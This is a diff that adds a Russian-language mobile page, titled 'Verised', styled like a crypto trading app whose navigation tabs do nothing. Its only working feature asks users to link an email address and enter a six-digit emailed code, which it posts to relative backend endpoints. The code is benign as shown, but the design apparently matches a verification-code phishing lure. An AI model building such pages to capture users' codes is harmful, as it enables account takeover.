@@ -4,8 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Expires" content="0">
     <title>Verised</title>
     <style>
         * {
@@ -16,14 +14,14 @@
 
         body {
             background: #000;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             width: 100vw;
             height: 100vh;
             overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
         }
 
+        /* Splash Screen */
         .splash {
             position: fixed;
             top: 0;
@@ -62,18 +60,385 @@
                 transform: scale(1);
             }
         }
+
+        /* Main Container */
+        .container {
+            display: none;
+            flex-direction: column;
+            height: 100vh;
+            padding-bottom: 70px;
+        }
+
+        .container.active {
+            display: flex;
+        }
+
+        /* Content Area */
+        .content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .lightning-icon {
+            font-size: 80px;
+            margin-bottom: 30px;
+            filter: drop-shadow(0 0 20px rgba(255, 193, 7, 0.5));
+        }
+
+        .content h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            line-height: 1.3;
+        }
+
+        .content p {
+            font-size: 15px;
+            color: #999;
+            margin-bottom: 40px;
+            line-height: 1.5;
+        }
+
+        .btn-primary {
+            background: #fff;
+            color: #000;
+            border: none;
+            border-radius: 12px;
+            padding: 16px 40px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            max-width: 400px;
+            transition: opacity 0.2s;
+        }
+
+        .btn-primary:active {
+            opacity: 0.7;
+        }
+
+        /* Bottom Navigation */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #1a1a1a;
+            display: flex;
+            justify-content: space-around;
+            padding: 10px 0;
+            border-top: 1px solid #333;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 5px;
+            cursor: pointer;
+            padding: 5px 15px;
+            transition: opacity 0.2s;
+        }
+
+        .nav-item:active {
+            opacity: 0.6;
+        }
+
+        .nav-item.active {
+            color: #ffc107;
+        }
+
+        .nav-icon {
+            font-size: 24px;
+        }
+
+        .nav-label {
+            font-size: 11px;
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: flex-end;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: #2a2a2a;
+            border-radius: 20px 20px 0 0;
+            padding: 20px;
+            width: 100%;
+            max-width: 500px;
+            animation: slideUp 0.3s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(100%);
+            }
+            to {
+                transform: translateY(0);
+            }
+        }
+
+        .modal-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .modal-back {
+            font-size: 24px;
+            cursor: pointer;
+            padding: 5px;
+        }
+
+        .modal-title {
+            font-size: 18px;
+            font-weight: 600;
+            flex: 1;
+            text-align: center;
+        }
+
+        .modal-close {
+            font-size: 24px;
+            cursor: pointer;
+            padding: 5px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-field {
+            width: 100%;
+            background: #1a1a1a;
+            border: 1px solid #444;
+            border-radius: 12px;
+            padding: 16px;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+        }
+
+        .input-field:focus {
+            border-color: #ffc107;
+        }
+
+        .btn-confirm {
+            background: #444;
+            color: #666;
+            border: none;
+            border-radius: 12px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            width: 100%;
+            cursor: not-allowed;
+        }
+
+        .btn-confirm.active {
+            background: #ffc107;
+            color: #000;
+            cursor: pointer;
+        }
+
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
+    <!-- Splash Screen -->
     <div class="splash" id="splash">
         <img src="logo.jpg" alt="Logo">
     </div>
 
+    <!-- Main Container -->
+    <div class="container" id="mainContainer">
+        <div class="content">
+            <div class="lightning-icon">⚡</div>
+            <h1>Держи аккаунт в<br>безопасности</h1>
+            <p>Сделай вход удобнее и<br>безопаснее — привяжи почту.</p>
+            <button class="btn-primary" onclick="openEmailModal()">Привязать почту</button>
+        </div>
+
+        <!-- Bottom Navigation -->
+        <div class="bottom-nav">
+            <div class="nav-item">
+                <div class="nav-icon">🏠</div>
+                <div class="nav-label">Главная</div>
+            </div>
+            <div class="nav-item">
+                <div class="nav-icon">⭐</div>
+                <div class="nav-label">Рынок</div>
+            </div>
+            <div class="nav-item active">
+                <div class="nav-icon">📊</div>
+                <div class="nav-label">Торговать</div>
+            </div>
+            <div class="nav-item">
+                <div class="nav-icon">💰</div>
+                <div class="nav-label">Доход</div>
+            </div>
+            <div class="nav-item">
+                <div class="nav-icon">👛</div>
+                <div class="nav-label">Кошелек</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Email Modal -->
+    <div class="modal" id="emailModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-back" onclick="closeEmailModal()">‹</div>
+                <div class="modal-title">Добавить почту</div>
+                <div class="modal-close" onclick="closeEmailModal()">✕</div>
+            </div>
+            <div class="input-group">
+                <input type="email" class="input-field" id="emailInput" placeholder="твоя@почта.com" oninput="checkEmail()">
+            </div>
+            <button class="btn-confirm" id="confirmBtn" onclick="sendCode()">Подтвердить</button>
+        </div>
+    </div>
+
+    <!-- Code Modal -->
+    <div class="modal" id="codeModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-back" onclick="closeCodeModal()">‹</div>
+                <div class="modal-title">Введите код</div>
+                <div class="modal-close" onclick="closeCodeModal()">✕</div>
+            </div>
+            <div class="input-group">
+                <input type="text" class="input-field" id="codeInput" placeholder="Код из письма" maxlength="6" oninput="checkCode()">
+            </div>
+            <button class="btn-confirm" id="confirmCodeBtn" onclick="verifyCode()">Подтвердить</button>
+        </div>
+    </div>
+
     <script>
-        // Через 1 секунду скрываем splash screen
+        let userEmail = '';
+        let sentCode = '';
+
+        // Hide splash and show main content
         setTimeout(() => {
             document.getElementById('splash').classList.add('hide');
+            document.getElementById('mainContainer').classList.add('active');
         }, 1000);
+
+        function openEmailModal() {
+            document.getElementById('emailModal').classList.add('active');
+        }
+
+        function closeEmailModal() {
+            document.getElementById('emailModal').classList.remove('active');
+        }
+
+        function checkEmail() {
+            const email = document.getElementById('emailInput').value;
+            const btn = document.getElementById('confirmBtn');
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            
+            if (emailRegex.test(email)) {
+                btn.classList.add('active');
+                btn.style.cursor = 'pointer';
+            } else {
+                btn.classList.remove('active');
+                btn.style.cursor = 'not-allowed';
+            }
+        }
+
+        async function sendCode() {
+            const email = document.getElementById('emailInput').value;
+            const btn = document.getElementById('confirmBtn');
+            
+            if (!btn.classList.contains('active')) return;
+
+            userEmail = email;
+            
+            // Send code to backend
+            try {
+                const response = await fetch('/api/send-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: email })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    closeEmailModal();
+                    document.getElementById('codeModal').classList.add('active');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Ошибка отправки кода');
+            }
+        }
+
+        function closeCodeModal() {
+            document.getElementById('codeModal').classList.remove('active');
+        }
+
+        function checkCode() {
+            const code = document.getElementById('codeInput').value;
+            const btn = document.getElementById('confirmCodeBtn');
+            
+            if (code.length === 6) {
+                btn.classList.add('active');
+                btn.style.cursor = 'pointer';
+            } else {
+                btn.classList.remove('active');
+                btn.style.cursor = 'not-allowed';
+            }
+        }
+
+        async function verifyCode() {
+            const code = document.getElementById('codeInput').value;
+            const btn = document.getElementById('confirmCodeBtn');
+            
+            if (!btn.classList.contains('active')) return;
+
+            try {
+                const response = await fetch('/api/verify-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: userEmail, code: code })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    closeCodeModal();
+                    alert('Почта успешно привязана!');
+                    // Reload or update UI
+                } else {
+                    alert('Неверный код');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Ошибка проверки кода');
+            }
+        }
     </script>
 </body>
 </html>
